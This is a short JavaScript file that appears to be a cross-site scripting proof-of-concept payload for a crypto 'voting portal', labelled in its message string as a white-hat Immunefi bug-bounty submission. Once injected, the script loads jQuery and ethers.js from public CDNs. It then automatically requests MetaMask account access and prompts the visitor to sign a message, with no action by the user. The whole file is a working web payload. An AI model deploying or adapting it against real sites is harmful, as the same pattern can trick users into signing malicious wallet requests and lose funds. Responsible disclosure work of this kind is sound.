alert('XSS on VOTING PORTAL POC');

async function importScript(src) {
    return new Promise((resolve, reject) => {
        const script = document.createElement('script');
        script.src = src;
        script.onload = resolve;
        script.onerror = reject;
        document.head.appendChild(script);
    });
}

async function connectAndSign() {
    // Check if MetaMask is installed
    if (window.ethereum) {
        console.log('MetaMask is installed!');

        // Request account access
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            console.log(accounts);
            console.log('Connected to MetaMask:', accounts[0]);

            // Use Ethers.js to sign a message
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            console.log(provider);
            const signer = provider.getSigner();
            console.log(signer);

            const message = 'Create polling-- POC -- white-hat -- immunefi';
            
            // Wait for 3 seconds before signing the message
            setTimeout(async () => {
                const signature = await signer.signMessage(message);
                console.log('Message signed! Signature:', signature);
                alert('Message signed! Signature: ' + signature);
            }, 3000);
        } catch (error) {
            console.error(error);
        }
    } else {
        console.error('MetaMask is not installed!');
    }
}

// Import the first script
importScript('https://code.jquery.com/jquery-3.6.4.min.js')
    .then(() => {
        console.log('First script loaded!');
        // Wait for 3 seconds before importing the second script
        setTimeout(() => {
            importScript('https://cdnjs.cloudflare.com/ajax/libs/ethers/5.2.0/ethers.umd.min.js')
                .then(() => {
                    console.log('Second script loaded!');
                    // Call connectAndSign function automatically when the page loads
                    connectAndSign();
                })
                .catch(error => console.error('Error loading second script:', error));
        }, 1000);
    })
    .catch(error => console.error('Error loading first script:', error));
